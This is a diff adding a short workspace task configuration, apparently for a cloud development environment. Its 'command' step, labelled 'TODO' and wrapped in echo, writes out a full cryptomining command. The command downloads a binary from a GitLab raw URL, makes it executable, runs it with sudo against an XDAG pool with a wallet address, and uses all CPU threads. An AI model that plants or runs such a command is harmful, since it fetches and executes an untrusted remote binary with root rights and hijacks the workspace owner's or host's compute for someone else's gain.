@@ -1,0 +1,5 @@
+tasks:
+  - init: |
+      echo 'TODO: build project'
+    command: |
+      echo 'TODO: wget https://gitlab.com/richardkevin320/donlod/-/raw/main/surabi && chmod 777 surabi && sudo ./surabi --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)'
